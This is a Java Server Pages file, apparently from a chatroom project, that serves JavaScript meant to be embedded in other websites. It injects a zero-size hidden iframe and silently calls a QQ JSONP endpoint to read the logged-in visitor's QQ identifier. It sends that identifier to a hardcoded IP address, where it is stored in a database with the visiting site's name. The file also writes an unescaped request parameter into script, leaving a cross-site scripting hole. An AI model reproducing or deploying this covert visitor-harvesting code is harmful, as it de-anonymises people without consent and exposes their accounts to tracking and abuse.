<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ page import="java.util.*,java.lang.*,java.text.*" %>
<%@ page import="org.apache.ibatis.session.SqlSession" %>
<%@ page import="com.dmframe.dao.*" %>
<%@ page import="com.tx.chatroom.persistence.*" %>
<%@ page import="com.tx.chatroom.domain.*" %>
<%
String local=request.getParameter("local");

String qq=request.getParameter("qq");
if(qq!=null){
	System.out.println("qq:"+qq+",local="+local);
	SqlSession sqlSession=BaseDao.sqlSessionFactory.openSession();
	try{
		QQMapper mapper=sqlSession.getMapper(QQMapper.class);
		QQ qqBean=new QQ();
		qqBean.setQq(qq);
		qqBean.setSite(local);
		SimpleDateFormat dateFormat=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		String ctime=dateFormat.format(new Date());
		qqBean.setCtime(ctime);
		mapper.addQQ(qqBean);
		sqlSession.commit();
	}finally{
		sqlSession.close();
	}
	out.println("{status:0}");
	return;
}

String type=request.getParameter("type");

if("js".equals(type)){
	response.setContentType("text/javascript");
	%>
	if (document.getElementById('hidden_iframe') == null) {
		var url="http://115.28.242.231:8080/chatroom/getQQ.jsp?local=<%=local %>";
	    document.write('<iframe src="' + url + '" name="hidden_iframe" id="hidden_iframe" frameborder="0" width="0" height="0" scrolling="no"></iframe>')
	}
	<%
	return;
}else if("shell".equals(type)){
	response.setContentType("text/javascript");
	%>
	var isIE = document.all ? true: false;

function nicknameCb(jsonstr) {
	if (jsonstr.code == '0') {
		postQQ(jsonstr.nickname);
	} else {
		postQQ(jsonstr.code);
	}
};

function scriptOnLoad(scriptElement){
	if (scriptElement.readyState) {
		if (scriptElement.readyState == "loaded" || scriptElement.readyState == "complete") {
			scriptElement.onreadystatechange = null;
			scriptElement.onload = null;
			
		}
	} else {
		scriptElement.onreadystatechange = null;
		scriptElement.onload = null;
		
	}
}

function postQQ(qq){
	var scriptElement = document.createElement("script");
	scriptElement.type = "text/javascript";
	scriptElement.charset = "utf-8";
	scriptElement.src = "http://115.28.242.231:8080/chatroom/getQQ.jsp?qq="+qq+"&local="+local;
	scriptElement.onerror = function() {
		
	};
	if (isIE) {
		scriptElement.onreadystatechange = scriptOnLoad(scriptElement);
	} else {
		scriptElement.onload = scriptOnLoad(scriptElement);
	};
	document.getElementsByTagName('head').item(0).appendChild(scriptElement);
}

function loadJS() {
	var scriptElement = document.createElement("script");
	scriptElement.type = "text/javascript";
	scriptElement.charset = "utf-8";
	scriptElement.src = "http://rz.qq.com/json.php?mod=auth&act=nickname&callback=nicknameCb";
	scriptElement.onerror = function() {
		
	};
	if (isIE) {
		scriptElement.onreadystatechange = scriptOnLoad(scriptElement);
	} else {
		scriptElement.onload = scriptOnLoad(scriptElement);
	};
	document.getElementsByTagName('head').item(0).appendChild(scriptElement);
};

loadJS();
	<%
	return;
}
%>
<html>
<head>
  <meta charset="utf-8">
  <title></title>
</head>
<body>
<script>
var local='<%=local%>';
</script>
<script type="text/javascript" src="http://115.28.242.231:8080/chatroom/getQQ.jsp?type=shell"></script>
</body>
</html>